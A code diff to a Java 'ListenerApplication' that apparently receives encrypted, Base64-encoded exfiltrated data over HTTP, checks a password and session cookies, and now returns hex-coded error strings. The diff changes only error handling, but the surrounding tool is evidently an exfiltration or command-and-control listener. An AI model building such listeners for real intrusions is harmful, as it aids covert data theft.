@@ -19,6 +19,8 @@ import java.security.InvalidAlgorithmParameterException;
 import java.security.KeyManagementException;
 import java.security.NoSuchAlgorithmException;
 import java.security.spec.AlgorithmParameterSpec;
+
+import javax.crypto.AEADBadTagException;
 import javax.crypto.BadPaddingException;
 import javax.crypto.Cipher;
 import javax.crypto.SecretKey;
@@ -106,14 +108,24 @@ public class ListenerApplication {
 			}
 
 			byte[] rawPostData = Base64.getUrlDecoder().decode(requestData.replace("=","").getBytes());
-			byte[] decryptedData = sapi.decrypt(rawPostData,sessionData.nonce.getBytes(),currentKey);
+			byte[] decryptedData;
+			try 
+			{
+				decryptedData = sapi.decrypt(rawPostData,sessionData.nonce.getBytes(),currentKey);
+			}
+			catch (AEADBadTagException e)
+			{
+				//encryption error
+				return "error.0x7461676D";
+			}
 
 
 			Hashtable xmlParsed = napi.xmlExfilToHashtable(new String(decryptedData));
 
 			if (!xmlParsed.get("aKey").toString().equals(epc.passwd))
 			{
-				return "nah";	
+				//bad password
+				return "error.0x61757468";	
 			}
 
 			ArrayList downstreamData = new ArrayList<String>(Arrays.asList(xmlParsed.get("downstream").toString().split(",")));
@@ -163,14 +175,15 @@ public class ListenerApplication {
 
 			if (!epc.sessionTable.keySet().contains(idCookie))
 			{
-				return "nah";
+				//bad cookie
+				return "error.0x73657373";
 			}
 			else
 			{
 				sessionData  = (session) epc.sessionTable.get(idCookie);
 				if (sessionData.cookie.equals(authCookie))
 				{
-					return "nah";
+					return "error.0x73657373";
 				}
 			}
 
